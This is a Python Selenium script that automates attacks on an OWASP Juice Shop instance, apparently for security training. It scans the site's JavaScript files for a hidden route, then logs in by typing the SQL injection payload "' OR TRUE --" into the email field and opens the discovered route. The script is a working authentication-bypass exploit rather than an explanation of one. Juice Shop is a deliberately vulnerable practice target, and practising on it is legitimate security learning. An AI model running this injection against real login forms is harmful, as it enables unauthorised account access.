from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

def scan_js_for_string(url, search_string):
  try:
    response = requests.get(url)
    response.raise_for_status()  # Raise an exception for bad status codes (4xx or 5xx)
    js_content = response.text

    if search_string in js_content:
      print(f"'{search_string}' found in the JavaScript source from {url}")
      return True, js_content
    else:
      print(f"'{search_string}' not found in the JavaScript source from {url}")
      return False, js_content

  except requests.exceptions.RequestException as e:
    print(f"Error fetching content from {url}: {e}")
    return False, None

try:
	IP_ADDRESS = os.environ['OWASP_JUICE_SHOP_IP_ADDRESS']
	PORT = os.environ['OWASP_JUICE_SHOP_PORT']
	driver = webdriver.Chrome()
	search_string = input("Enter search route: ")
	url = f"http://{IP_ADDRESS}:{PORT}"
	response = requests.get(url)
	html_content = response.text

	#Parse HTML for JS files (user searches for JS files)
	soup = BeautifulSoup(html_content, 'html.parser')
	js_srcs = [script['src'] for script in soup.find_all('script') if 'src' in script.attrs]

	#Create absolute URLs of all JS files
	absolute_client_files = []
	for file_path in js_srcs:
		absolute_client_files.append(urljoin(url, file_path))

	#Parse all JS files for search_string and append to URL if found (user searches JS files for URL route & tests route in browser)
	for file_url in absolute_client_files:
		found, content = scan_js_for_string(file_url, search_string)

		if found:
			#User opens browser
			driver.get(url)
			#User logs in
			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Dismiss')]"))).click()
			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Account')]"))).click()
			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Login')]"))).click()
			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "email"))).send_keys("' OR TRUE --")
			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.ID, "password"))).send_keys("Password1!")
			WebDriverWait(driver, 20).until(EC.element_to_be_clickable((By.XPATH, "//button[contains(., 'Log in')]"))).click()
			input("PAUSE")
			driver.get(f"http://{IP_ADDRESS}:{PORT}/#/" + search_string)
			input("PAUSE")
finally:
  driver.quit()
